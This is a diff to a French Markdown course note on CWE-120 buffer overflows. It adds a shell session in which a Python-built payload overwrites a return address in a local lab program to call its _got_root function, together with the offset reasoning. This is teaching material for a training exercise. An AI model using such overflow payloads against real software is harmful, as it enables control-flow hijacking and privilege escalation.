@@ -44,6 +44,20 @@ une fois l'adresse trouvée, par exemple : **0x4011de** l'envoi de l'adresse oct
 `print()` utilise UTF8 sur deux octets, il faut utiliser `sys.stdout.buffer.write()` en précisant le code format **b**
 * `echo $(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 10 + b'\xde\x11\x40\x00')")` 
 
+```bash
+edf@localhost ~/Doali/coding/securite/formation/CWE_120 |5fc8b21 master| $ ./cwe_120 $(echo $(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 104 + b'\x00\x86\x11\x40')"))
+bash: warning: command substitution: ignored null byte in input
+sizeof(m_buf) : 112
+adresse de _got_root : 0x401186
+size=112
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@
+Wootwoot, you are now root!
+edf@localhost ~/Doali/coding/securite/formation/CWE_120 |5fc8b21 master| $ 
+```
+
+> Car la structure fait 112 et que l'adresse est sur 8 octets et donc il nous faut remplir 104 octets et ensuite ajouter notre adresse
+> pour pouvoir appeler notre fonction `_got_root` dont l'adresse est connue
+
 ### le tout ensemble
 * `./main $(python -c "print('A'*10)")`  
 permet d'envoyer la chaîne de caractères générée par python vers l'entrée standard de notre programme 
